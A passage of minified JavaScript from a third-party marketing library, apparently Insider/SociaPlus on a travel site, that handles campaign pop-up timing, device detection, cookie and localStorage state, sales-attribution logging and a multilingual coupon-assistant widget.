else if(camp.trigTimeOut>0){if(!spApi.isOnAfterPaymentPage()){if(!spApi.spCampCheckStatus(camp.id,'sc')){setTimeout(function(){sQuery("#spEvent").show();spApi.animateShowCamp();},camp.trigTimeOut*1000);}else{sQuery("#spEvent").show();}}}}}catch(err){spApi.errLog(err,{logType:'showCamp',bugType:'product',extraData:{param1:camp,param2:viewType,param3:independent}});}},checkConditionNeed:function(camp){if(typeof camp=='undefined'||camp==null){return false;}
if(typeof camp.isBounce!=='undefined'&&camp.isBounce=='1'){return true;}
if(typeof camp.conditionNeeds!=='undefined'&&((typeof camp.conditionNeeds.bounce!=='undefined'&&camp.conditionNeeds.bounce=='1')||(typeof camp.conditionNeeds.scroll!=='undefined'&&camp.conditionNeeds.scroll=='1'))){return true;}
return false;},animateShowCamp:function(){if(spApi.activeCamp){data={key:'sp-camp-'+spApi.activeCamp.id,obj:{'step1-displayed':true},campId:spApi.activeCamp.id};if(spApi.activeCamp.productType!=21){spApi.updateCookie(data);}}
spApi.attr.spEvent.left=-3;sQuery('#spEvent').delay(250).animate(spApi.attr.spEvent,500,function(){sQuery('.spHeaderNav').text(String.fromCharCode(171));});},animateHideCamp:function(){if(spApi.activeCamp){data={key:'sp-camp-'+spApi.activeCamp.id,obj:{'sc':true},campId:spApi.activeCamp.id};spApi.updateCookie(data);}
if(spApi.activeCamp.productType==22)
spApi.attr.spEvent.left=(spApi.activeCamp.theme==1)?-806:-606;else
spApi.attr.spEvent.left=-536;sQuery('#spEvent').animate(spApi.attr.spEvent,500,function(){sQuery('.spHeaderNav').text(String.fromCharCode(187));});},getTime:function(){return Math.round(new Date()/1000+3600);},getUTCTime:function(){var now=new Date();var time=now.getTime();var offset=now.getTimezoneOffset()*60000;return Math.round((time-offset)/1000);},showRsvp:function(){},isRefContains:function(data)
{var res=document.referrer.indexOf(data)>-1;return res;},hasText:function(selectedText,comparedText){try{if(typeof selectedText!=="undefined"&&selectedText!==null){return selectedText.indexOf(comparedText)>-1?true:false;}else{return false;}}catch(err){spApi.errLog(err,{logType:'hasText',bugType:'partner',extraData:{param1:selectedText,param2:comparedText}});}},hasParameter:function(name,exactMatch)
{try{if(typeof exactMatch==="undefined")
exactMatch=false;try{var uri=decodeURI(window.location.href);}catch(err){var uri=unescape(window.location.href);}
if(exactMatch==false){name=decodeURI(name.replace(/[\[\]\/\?]/g,"\\$&"));var regex=new RegExp(name);var results=regex.exec(uri);if(results==null){return false}else
return true;}else if(exactMatch==true){var pageUrl=window.location.href.replace('www.','');if(pageUrl==name){return true;}else{return false;}}}catch(err){spApi.errLog(err,{logType:'hasParameter',bugType:'product',extraData:{param1:name,param2:exactMatch}});}},checkCampaignLanguage:function(camp){if(camp.lang=='all_ALL'||sQuery.inArray(camp.productType,[32,39,47])>-1){return true;}
return spApi.getLang()==camp.lang;},addZeroToUtcHours:function(hour){if(hour<10){hour="0"+hour;}
return hour;},checkDailyDisplay:function(camp){try{var currentDate=new Date();var utcCurrentTime=spApi.addZeroToUtcHours(currentDate.getUTCHours())+':'+currentDate.getUTCMinutes();var utcCurrentDay=spApi.getUTCDayString(currentDate.getUTCDay());var dailyDisplay=camp.dailyDisplay;if(typeof dailyDisplay==='undefined'||!dailyDisplay.length>0){return true;}
dailyDisplay=JSON.parse(dailyDisplay);if(typeof dailyDisplay==='object'){if(sQuery.inArray('all',dailyDisplay.days)>-1||sQuery.inArray(utcCurrentDay,dailyDisplay.days)>-1){return utcCurrentTime>dailyDisplay.start&&utcCurrentTime<dailyDisplay.end;}}
return false;}catch(err){spApi.errLog(err,{logType:'dailyDisplay',bugType:'product'});return false;}},getUTCDayString:function(dayIndex){var weekDay=["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"];return weekDay[dayIndex];},deviceDetect:function(targetDevice){if(targetDevice=='All')return true;var userAgent=navigator.userAgent.toLowerCase();var isMobile=(/iphone|ipod|android|blackberry|opera mini|opera mobi|skyfire|maemo|windows phone|palm|iemobile|symbian|symbianos|fennec/i.test(userAgent));var isTablet=(/(?!.*tablet pc)(ipad|android|sch-i800|playbook|tablet|kindle|gt-p1000|sgh-t849|shw-m180s|a510|a511|a100|dell streak|silk)/i).test(userAgent);if(userAgent.toLowerCase().indexOf('android')>-1){isTablet=isTablet&&userAgent.indexOf('mobile')==-1;isMobile=isMobile&&userAgent.indexOf('mobile')!=-1;}
var device='PC';if(isMobile){device='Mobil';}else if(isTablet){device='Tablet';}
return device==targetDevice;},isOnPanel:function(){try{return window.self!==window.top;}catch(err){spApi.errLog(err,{logType:'isOnPanel',bugType:'partner',extraData:{}});}},globalXMLParser:function(url_string,callback,search_value){pm({target:sQuery('#spWorker')[0].contentWindow,type:'globalXMLParser',data:{url_string:url_string,pName:"klook",s_value:search_value},data:{url_string:url_string,pName:"klook",search_value:search_value},success:function(response_data){callback(response_data);return response_data;}})},getParameter:function(name)
{name=name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");var regexS="[\\?&#]"+name+"=([^&#]*)";var regex=new RegExp(regexS);var results=regex.exec(window.location.href);if(results==null){return"";}else{try{return decodeURIComponent(results[1].replace(/\+/g," "));}catch(err){spApi.errLog(err);return unescape(results[1].replace(/\+/g," "));}}},isParameter:function(name)
{var parameter=spApi.getParameter(name);return(parameter!="")?true:false;},getUserData:function(dataType)
{try{if(dataType=="gender"){if(JSON.parse(localStorage.getItem('spUserData'))[dataType].toLowerCase()=="erkek"){return"male";}else if(JSON.parse(localStorage.getItem('spUserData'))[dataType].toLowerCase()=="kadn"||JSON.parse(localStorage.getItem('spUserData'))[dataType].toLowerCase()=="kadin"){return"female";}else{return JSON.parse(localStorage.getItem('spUserData'))[dataType];}}else{return JSON.parse(localStorage.getItem('spUserData'))[dataType];}}catch(err){spApi.errLog(err,{logType:'getUserData',bugType:'product',extraData:{param1:dataType}});}},setSessionStorage:function(storageName,storeValue)
{spApi.sessionStorageSet(storageName,JSON.stringify(storeValue));},getSessionStorage:function(storageName)
{try{return JSON.parse(spApi.sessionStorageGet(storageName))}catch(err){spApi.errLog(err);spApi.setSessionStorage(storageName,'');return[];}},updateCookie:function(data,type){try{type=typeof type!=='undefined'?type:"general";var campId;if(data.campId)
campId=data.campId;var cookieExpireDate=14;if(typeof campId!=='undefined'){var controlCamp=spApi.getCamp(campId);if(typeof controlCamp.camp!=='undefined'){cookieExpireDate=parseInt(controlCamp.camp.cookieTime);}else if(typeof spApi.webPushes[campId]!=='undefined'){cookieExpireDate=parseInt(spApi.webPushes[campId].cookieTime);}}
var isLocalstorage=false;var localStorageList=['sp-camp','ins-insight','sp-goal','user-segments','paid-products','ins-wp','prodCats'];sQuery.each(localStorageList,function(index,keyName){if(data.key.indexOf(keyName)>-1){isLocalstorage=true;}});c=(isLocalstorage&&spApi.storageData(data.key)!=null)?spApi.storageData(data.key):sQuery.cookie(data.key);if(data.key.indexOf('sp-camp-')>-1&&spApi.salesSesId!=spApi.Base64.encode('0')){if(c==null){data.obj.salesSesId=spApi.Base64.decode(spApi.salesSesId);data.obj.salesSesTime=spApi.getTime();}}
newC=data.obj;if(data.key=='user-segments'){var cookieExpireDate=new Date();cookieExpireDate.setTime(cookieExpireDate.getTime()+(60*60*1000));}
if(data.obj['step1-displayed']){data.obj.viDa=spApi.getTime();}else if(data.obj['joined']||data.obj['liked']){data.obj.joDa=spApi.getTime();}else if(data.obj['closed']){data.obj.clDa=spApi.getTime();}
if(spApi.isAudienceProduct(campId)){var paaGroupData=spApi.storageData('paaGroup');if(paaGroupData==null){if(Math.floor(Math.random()*100)+1<=95){paaGroupData='experimental';}else{paaGroupData='control';}
spApi.storageData('paaGroup',paaGroupData,{path:'/',expires:7,domain:cookieDomain});}
data.obj.paaRoiType=paaGroupData;}
if(c){if(data.key=='sp-notes'){sQuery.cookie(data.key,c,{path:'/',expires:cookieExpireDate,domain:cookieDomain});}else{oldC=JSON.parse(c);newC=sQuery.extend(true,oldC,newC);if(!isLocalstorage){sQuery.cookie(data.key,sQuery.toJSON(newC),{path:'/',expires:cookieExpireDate,domain:cookieDomain});}else{spApi.storageData(data.key,sQuery.toJSON(newC),{path:'/',expires:cookieExpireDate,domain:cookieDomain});}}}else{if(data.key=='sp-notes'){sQuery.cookie(data.key,data.obj,{path:'/',expires:cookieExpireDate,domain:cookieDomain});}else{if(!isLocalstorage){sQuery.cookie(data.key,sQuery.toJSON(data.obj),{path:'/',expires:cookieExpireDate,domain:cookieDomain});}else{spApi.storageData(data.key,sQuery.toJSON(data.obj),{path:'/',expires:cookieExpireDate,domain:cookieDomain});}}}
if(type!="AB"&&data.key!='sp-notes'&&type!="nolog"){this.worker.check(JSON.parse(c),newC,campId);}}catch(err){spApi.errLog(err,{logType:'updateCookie',bugType:'product',extraData:{param1:data,param2:type}});}},isAudienceProduct:function(campId){var paaProductIds=['32','39','40','47'];return typeof campId!=='undefined'&&typeof spApi.getCamp(campId).camp!=='undefined'&&paaProductIds.indexOf(spApi.getCamp(campId).camp.productType)>-1;},setCookie:function(data,callback){this.worker.cookie(data,callback);},isFreqRule:function(rule){try{return rule.test.indexOf("getMinutes")<0?false:true;}
catch(err){spApi.errLog(err);return false;}},validateEmail:function(email,limit){if(!email){return false;}
if(!limit){var emailReg=/^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;}else{var emailReg=/^([\w-\.]+@([\w-]+\.)+[\w-]{3,4})?$/;}
if(emailReg.test(email)){return true;}
return false;},reformatDate:function(date,withTimeString){try{date=date||'';if(!date||date.length<10)
return date;date=date.toString();var mappedText=date;if(date.replace(/[0-9]/g,"").length===0){if(date.length==10){date=parseInt(date*1000);}
var date=new Date(parseInt(date));mappedText=date.getFullYear()+'-'+("00"+(date.getMonth()+1)).substr(-2,2)+'-'+("00"+date.getDate()).substr(-2,2);if(withTimeString){mappedText=mappedText+' '+("00"+date.getHours()).substr(-2,2)+':'+("00"+date.getMinutes()).substr(-2,2)+':'+("00"+date.getSeconds()).substr(-2,2);}}
else{date=date.replace(/[^0-9]/g,"-");mappedText=date;var splitDate=date.split('-');if(splitDate.length!==3)
return'';if(splitDate[0].length<4){mappedText=splitDate[2]+'-'+splitDate[1]+'-'+splitDate[0];}}
return mappedText;}catch(err){spApi.errLog(err,{logType:'reformatDate',bugType:'product'});}},hashCode:function(str){var hash=0;if(str.length==0)return hash;for(i=0;i<str.length;i++){char=str.charCodeAt(i);hash=((hash<<5)-hash)+char;hash=hash&hash;}
return Math.abs(hash);},widgets:{},spCampCheckStatus:function(id,condition){try{if(typeof(id)=='undefined'||id=='undefined')return false;var c=spApi.storageData('sp-camp-'+id);var id=id.toString();if(!c||id=='undefined')
return false;else{var controlCamp=spApi.getCamp(id);c=JSON.parse(c);var status=(condition=="liked")?(c["liked"]||c["closed"]):(c[condition]==true?true:false);if(condition=="liked"||condition=="joined"){tempId=id.toString();if(tempId.indexOf('c')<0){controlCamp=controlCamp.camp;var closeLimitStatus=false;var joinLimitStatus=false;if(c["joDa"]!=undefined){joinLimitStatus=joinLimitStatus=c["joDa"]+controlCamp.joinControlLimit*60*60>spApi.getTime();}
if(c["clDa"]!=undefined){closeLimitStatus=c["clDa"]+controlCamp.closeControlLimit*60*60>spApi.getTime();}
status=status&&(closeLimitStatus||joinLimitStatus);}}else if(condition=="closed"&&c["clDa"]!=undefined){status=status&&c["clDa"]>spApi.getTime()-controlCamp.closeControlLimit*60*60;}
if(typeof status==='string'){return status=="";}else{return status==true;}}}catch(err){spApi.errLog(err,{logType:'spCampCheckStatus',bugType:'product',extraData:{param1:id,param2:condition}});}},getStandardLogData:function(){var data={originalPrice:spApi.getExchangeRate(spApi.preferredCurrency,sQuery.cookie('current-currency'),sQuery.cookie('total-cart-amount'),'price'),originalCurrency:(sQuery.cookie('current-currency')!=null)?sQuery.cookie('current-currency'):'',convertedCurrency:spApi.preferredCurrency,convertedPrice:(sQuery.cookie('total-cart-amount')!=null)?sQuery.cookie('total-cart-amount'):'',sessionId:spApi.salesSesId};return data;},setSaLog:function(id,condition,sendLog){if(sendLog!==false&&window.spSalesOk==1)return;window.spSalesOk=1;var orderID=(spApi.getOrderId()!=undefined&&spApi.getOrderId()!=null&&spApi.getOrderId()!='')?spApi.getOrderId():'ins_unknown_'+Math.random().toString(36).substr(2,5)+'_'+spApi.getTime();var salesOrderId=sQuery.cookie("salesOrderId");if(salesOrderId!=null&&salesOrderId==orderID){return;}else{sQuery.cookie("salesOrderId",orderID,{path:'/',domain:cookieDomain});}
var cookies=spApi.allStorageData();var joinSalesEnable=false;var joinDate=false;var viewDate=false;var bSP=1333411200;var lastJoinDate=lastViewDate=bSP;var logObj=new Object();var lastCookieForCatch='';sQuery.each(cookies,function(i,obj){var cookieKey=obj.key;var value=unescape(obj.value);try{if(cookieKey.indexOf("sp-camp")!=-1){if(value.indexOf("joined")!=-1||value.indexOf("liked")==-1||value.indexOf("step1-displayed")!=-1){lastCookieForCatch=value;var logType='bounce-sales';var cookieContent=JSON.parse(value);if(value.indexOf("joined")!=-1||value.indexOf("liked")!=-1){logType='sales';joinSalesEnable=true;joinDate=typeof cookieContent.joDa!=='undefined'?cookieContent.joDa:bSP;}else if(joinSalesEnable){return;}else{viewDate=bSP;if(cookieContent!=null&&cookieContent.viDa!=='undefined'){viewDate=cookieContent.viDa;}}
if(joinSalesEnable&&joinDate>=lastJoinDate){lastJoinDate=joinDate;logObj=setLogVariable(cookieKey,cookieContent,logType);}else if(!joinSalesEnable&&viewDate>=lastViewDate){lastViewDate=viewDate;logObj=setLogVariable(cookieKey,cookieContent,logType);}}}}catch(err){spApi.errLog(err,{logType:'setSaLog',bugType:'product',extraData:{param1:lastCookieForCatch}});}});if(typeof spApi.setInsightSalesLog==='function'){spApi.setInsightSalesLog(orderID);}
if(typeof spApi.setVersusSalesLog==='function'){spApi.setVersusSalesLog(orderID);}
spApi.setPushSalesLog(orderID);function setLogVariable(cookie,cookieContent,logType){var logObj=new Object();id=cookie.split("-");if(id[2].indexOf("c")>=0){logObj.id=Number(id[2].replace("c",""));logObj.productType="custom";logObj.salesProductType=20;}else{logObj.id=Number(id[2]);logObj.productType="other";logObj.salesProductType=logObj.productType;}
logObj.type="";logObj.coupon=cookieContent.c;logObj.amount=sQuery.cookie('total-cart-amount');logObj.products=spApi.storageData('paid-products');logObj.logType=logType;return logObj;}
if(sendLog===false)return logObj;try{sQuery.each(spApi.personalizationCamps,function(key,prsnlztn){if(typeof prsnlztn=='undefined'){return;}
sQuery.each(prsnlztn.variations,function(varIdKey,variation){if(typeof variation=='undefined'){return;}
if(typeof spApi['camp'+variation.varId]!=='undefined'&&spApi['camp'+variation.varId].productType==31){return;}
if(spApi.spCampCheckStatus(variation.varId,"step1-displayed")){if(typeof spApi.getCamp(variation.varId).camp!=='undefined'&&typeof spApi.getCamp(variation.varId).camp.saLogDuration!=='undefined'){var campSaLogDuration=spApi.getCamp(variation.varId).camp.saLogDuration;}else{var campSaLogDuration=336;}
var viDa=sQuery.parseJSON(spApi.storageData('sp-camp-'+variation.varId)).viDa;viDa=new Date(viDa*1000);viDa.setHours(viDa.getHours()+campSaLogDuration);if(viDa>spApi.getTime()){var logParams={campId:variation.varId,referer:encodeURIComponent(logObj.amount),ref:window.document.referrer,url:window.document.URL,productType:(spApi.getCamp(variation.varId).camp.productType=="20")?("custom"):("other"),multivariateGroup:key,orderId:orderID,paidProducts:logObj.products,sessionId:spApi.salesSesId,salesSesId:spApi.getCampSalesSesInfo(variation.varId,'salesSesId',spApi.getCamp(variation.varId).camp.productType),salesSesTime:spApi.getCampSalesSesInfo(variation.varId,'salesSesTime',spApi.getCamp(variation.varId).camp.productType)+'-'+spApi.getTime(),appliedCode:spApi.getAppliedCode(variation.varId),salesType:'variation-sales',paaRoiGroup:sQuery.parseJSON(spApi.storageData('sp-camp-'+variation.varId)).paaRoiType,paaProductType:spApi.getCamp(variation.varId).camp.productType};logParams=sQuery.extend(logParams,spApi.getStandardLogData());spApi.worker.send('sales-log',logParams);}}});});}catch(e){spApi.errLog(e,{logType:'setLogVariable (variation-sales) ',bugType:'product'});spApi.conLog('personalizationCamps log error');spApi.conLog(e);}
if(id){var referrer=encodeURIComponent(logObj.coupon+"|-|"+logObj.amount);var saleCampId=(logObj.productType=="custom")?('c'+logObj.id):(logObj.id);if(typeof spApi.getCamp(saleCampId).camp!=='undefined'&&typeof spApi.getCamp(saleCampId).camp.saLogDuration!=='undefined'){var campSaLogDuration=spApi.getCamp(saleCampId).camp.saLogDuration;}else{var campSaLogDuration=336;}
var campNameString=(logObj.productType=="custom"&&typeof logObj.id==='number')?"sp-camp-c"+logObj.id:"sp-camp-"+logObj.id;var viDa=JSON.parse(spApi.storageData(campNameString)||sQuery.cookie(campNameString)).viDa;viDa=new Date(viDa*1000);viDa.setHours(viDa.getHours()+campSaLogDuration);if((logObj.logType!='sales'&&logObj.logType!='bounce-sales')||viDa>spApi.getTime()){var logParams={campId:logObj.id,referer:referrer,ref:window.document.referrer,url:window.document.URL,productType:logObj.productType,paidProducts:logObj.products,sessionId:spApi.salesSesId,salesSesId:spApi.getCampSalesSesInfo(logObj.id,'salesSesId',logObj.salesProductType),salesSesTime:spApi.getCampSalesSesInfo(logObj.id,'salesSesTime',logObj.salesProductType)+'-'+spApi.getTime(),appliedCode:spApi.getAppliedCode(logObj.id),orderId:orderID,salesType:logObj.logType+logObj.type};logParams=sQuery.extend(logParams,spApi.getStandardLogData());this.worker.send('sales-log',logParams);}}
var logParams={type:'sa-co',orderId:orderID,paidProducts:(spApi.storageData('paid-products')!=null)?spApi.storageData('paid-products'):'',sessionId:spApi.salesSesId,salesSesId:spApi.getCampSalesSesInfo(logObj.id,'salesSesId',logObj.salesProductType),salesSesTime:spApi.getCampSalesSesInfo(logObj.id,'salesSesTime',logObj.salesProductType)+'-'+spApi.getTime(),referer:encodeURIComponent("notavailable"+"|-|"+sQuery.cookie('total-cart-amount')),ref:window.document.referrer,globalExperiment:(spApi.storageData("globalExperimentRate")!=null)?1:0,globalExperimentType:(spApi.storageData("globalExperimentRate")!=null&&JSON.parse(spApi.storageData("globalExperimentRate"))['assign']=='A')?'variation-sales-A':'variation-sales-B',campId:0};logParams=sQuery.extend(logParams,spApi.getStandardLogData());this.worker.send('do-logging',logParams);return logObj;},isMobileBrowser:function(){(function(a){sQuery.browser.mobile=/android.+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|e\-|e\/|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(di|rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|xda(\-|2|g)|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))})(navigator.userAgent||navigator.vendor||window.opera);if((/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||sQuery.browser.mobile)){if(typeof window.isMobileBrowser=='undefined'){spApi.consoleLog.push('INSIDER(formerly SOCIAPlus) API is steady for mobile devices.');window.isMobileBrowser=true;}
return true;}else{return false;}},isMobileCamp:function(campaign){var status=false;if(typeof campaign!='undefined'){if(campaign.platform==='mobile'&&!spApi.deviceDetect('Tablet')){status=true;}else if(spApi.isMobileBrowser()){status=(campaign.productType=='30')?true:status;}}
return status;},isTabletCamp:function(campaign){return campaign.platform==='tablet';},isAllPagesCamp:function(campaign){return campaign.platform==='all';},showNotes:function(data,fromJoin,fromPurcha){if(typeof window.spInit=="undefined"){try{var notesDate=new Date();var fromJoin=typeof fromJoin!=='undefined'?fromJoin:false;var fromPurcha=typeof fromPurcha!=='undefined'?fromPurcha:false;notesDate.setTime(notesDate.getTime()+(14*24*60*60*1000));var removeAssistantCookie=function(){sQuery.cookie('sp-notes',null,{expires:notesDate,path:'/',domain:cookieDomain});sQuery.cookie('ins-adp-assist',null,{expires:notesDate,path:'/',domain:cookieDomain});};if(this.notes)
notes=JSON.parse(this.notes);else
notes={};if(spApi.isOnAfterPaymentPage()==true){notes={};this.displayNotes=0;removeAssistantCookie();}
if(data){data=data.split("|");camp=spApi.getCamp(data[1]).camp;if(!camp.isActive||camp.showNotes=="")
return false;if(camp.showNotes!=""&&camp.showNotes!=undefined&&camp.showNotes.length>0){notes[data[0]]=camp.couponExpDate+"#"+camp.showNotes+"#"+camp.couponAutoApply;sQuery.cookie('sp-notes',2+'|'+sQuery.toJSON(notes),{expires:notesDate,path:'/',domain:cookieDomain});this.displayNotes=2;}
if(this.displayNotes==undefined){this.displayNotes=2;}}
var couponAsistantShowControl=1;if(sQuery.cookie('couponAsistantShowed')!=null&&Number(sQuery.cookie('couponAsistantShowed'))==1){couponAsistantShowControl=0;}
if(!fromJoin&&(this.displayNotes==1||this.displayNotes==2||this.displayNotes==3)&&couponAsistantShowControl){sQuery(document).ready(function(){i=0;var lang={};lang["en"]={};lang["en"]["coupAssitCode"]="Your Coupon";lang["en"]["coupAssitCopy"]="Copy";lang["en"]["coupAssitCopyMsg"]="Your Coupon Copied";lang["en"]["coupAssitCopyMsgBody"]="You can activate your coupon by pasting on coupon area in basket page.";lang["tr"]={};lang["tr"]["coupAssitCode"]="Kupon Kodunuz";lang["tr"]["coupAssitCopy"]="Kopyala";lang["tr"]["coupAssitCopyMsg"]="Kupon kodunuz kopyaland&#305";lang["tr"]["coupAssitCopyMsgBody"]="&#214;deme sayfas&#305;nda kupon alan&#305;na yap&#305;&#351;t&#305;rarak indiriminizi etkinle&#351;tirin.";lang["ru"]={};lang["ru"]["coupAssitCode"]="&#1050;&#1086;&#1076; &#1050;&#1091;&#1087;&#1086;&#1085;&#1072;";lang["ru"]["coupAssitCopy"]="&#1050;&#1086;&#1087;&#1080;&#1088;&#1086;&#1074;&#1072;&#1090;&#1100;";lang["ru"]["coupAssitCopyMsg"]="&#1053;&#1072; &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;&#1077; &#1086;&#1092;&#1086;&#1088;&#1084;&#1083;&#1077;&#1085;&#1080;&#1103; &#1079;&#1072;&#1082;&#1072;&#1079;&#1072; &#1074;&#1074;&#1077;&#1076;&#1080;&#1090;&#1077; &#1082;&#1086;&#1076; &#1082;&#1091;&#1087;&#1086;&#1085;&#1072; &#1080; &#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1077; &#1089;&#1082;&#1080;&#1076;&#1082;&#1091;";lang["pl"]={};lang["pl"]["coupAssitCode"]="Tw&oacute;j Kupon";lang["pl"]["coupAssitCopy"]="Kopiuj";lang["pl"]["coupAssitCopyMsg"]="Tw&oacute;j Kupon zosta&#322; skopiowany";lang["pl"]["coupAssitCopyMsgBody"]="Mo&#380;esz aktywowa&#263; sw&oacute;j kupon poprzez wklejenie jego w miejscu do tego przeznaczonym na stronie zam&oacute;wie&#324;.";var spLang="en";if(spApi.getLang()=="tr_TR"){spLang="tr";}else if(spApi.getLang()=="ru_RU"){spLang="ru";}else if(spApi.getLang()=="pl_PL"){spLang="pl";}
var couponText=new Array();var noteText=new Array();var noteExpDate=new Array();var date=Math.round(+new Date()/1000+3600*1);for(key in notes){couponText[i]=key;if(notes[key].split("#").length!=undefined&&notes[key].split("#").length>1){noteText[i]=notes[key].split("#")[1];noteExpDate[i]=notes[key].split("#")[0];if(noteExpDate[i]>0&&date>=noteExpDate[i]){delete notes[couponText[i]];var assistStatus=2;var notesCount=0;for(key in notes){notesCount++;}
if(!notesCount>0){assistStatus=0;spApi.displayNotes=4;}
sQuery.cookie('sp-notes',assistStatus+'|'+sQuery.toJSON(notes),{expires:notesDate,path:'/',domain:cookieDomain});}}
else{noteText[i]=notes[key];}
i++;}
if(sQuery.cookie('ins-adp-assist')&&i==1){spApi.logger('info','Adaptif kupon asistan aktif');var adpSettings=JSON.parse(sQuery.cookie('ins-adp-assist'));sQuery("head link[rel='stylesheet']").last().after("<link rel='stylesheet' href='"+spApi.staticUrl+"fonts/fontello/css/fontello.css' type='text/css' media='screen'>");sQuery("head link[rel='stylesheet']").last().after("<link rel='stylesheet' href='"+spApi.apiUrl+"css/adp.css' type='text/css' media='screen'>");var adaptiveHtml='<div id="adaptive-assistant"><div id="adaptive-box"><p id="adaptive-text">'+adpSettings.text+'</p></div><div id="adaptive-assistant-box" style="background-color: '+adpSettings.bgColor+';"><i id="adaptive-icon" class="ins-icon-'+adpSettings.ic+'" style="color: '+adpSettings.color+';"></i></div></div>';sQuery('body').append(adaptiveHtml);sQuery('#adaptive-icon').die('click').live('click',function(){sQuery('#adaptive-box').toggleClass('display-table');});}
else if(sQuery('#sp-notes').length<=0){spApi.logger('info','Kupon asistan aktif');sQuery('body').append('<div id="sp-notes"><div class="sp-notes-pop"><a href="javascript:;" class="sp-notes-pop-close"></a><strong id="coupAssitCopyMsg"></strong><br><div id="coupAssitCopyMsgBody"></div></div><div class="sp-title">Kupon Kodunuz</div><a href="javascript:;" class="sp-noteMin"></a><a href="javascript:;" class="sp-noteClose"></a><div class="sp-couponHolder"><a href="javascript:;" class="sp-notePrev"></a><span id="scissor2"></span><div class="sp-coupon"></div><a href="javascript:;" class="sp-noteNext"></a><a href="javascript:;" style="display:none;width:100%;text-align:center;" class="sp-copy"></a></div><div class="sp-note"></div><div class="product-footer"><div class="marka-logo"><img src="//klook.img.sociaplus.com/" /></div><div class="socia-logo"><img src="'+spApi.apiUrl+'images/pw_65x13.png" /></div></div></div>');}
sQuery('.sp-title').html(lang[spLang]["coupAssitCode"]);sQuery('.sp-copy').html(lang[spLang]["coupAssitCopy"]);sQuery('#coupAssitCopyMsg').html(lang[spLang]["coupAssitCopyMsg"]);sQuery('#coupAssitCopyMsgBody').html(lang[spLang]["coupAssitCopyMsgBody"]);sQuery('.sp-coupon').html(couponText[i-1]);sQuery('.sp-note').html(noteText[i-1]);sQuery('.sp-noteB').unbind("click").click(function(e){e.preventDefault();});if(i>1){sQuery(".sp-notePrev, .sp-noteNext").unbind("click").css("display","block");var j=i-1;sQuery('.sp-noteNext').die('click').live('click',function(e){sQuery('#sp-notes').fadeOut(50).delay(50).fadeIn(50,function(){sQuery('.sp-coupon').html(couponText[j]);sQuery('.sp-note').html(noteText[j]);});j++;if(j>=i)
j=0;});sQuery('.sp-notePrev').die('click').live('click',function(e){sQuery('#sp-notes').fadeOut(50).delay(50).fadeIn(50,function(){sQuery('.sp-coupon').html(couponText[j]);sQuery('.sp-note').html(noteText[j]);});j--;if(j<=-1)
j=i-1;});}
if(sQuery('#sp-notes').length>0){if(sQuery.trim(sQuery('.sp-coupon').text())=="")
removeAssistantCookie();if((spApi.displayNotes==2||spApi.displayNotes==3)&&sQuery.trim(sQuery('.sp-coupon').text())!=""){var bottom=0;if(spApi.displayNotes==3){sQuery('#sp-notes').css("bottom",bottom+"px");}
else{setTimeout(function(){sQuery('#sp-notes').animate({bottom:bottom+"px"},1500);sQuery.cookie('sp-notes',3+'|'+sQuery.toJSON(notes),{expires:notesDate,path:'/',domain:cookieDomain});},1000);}}
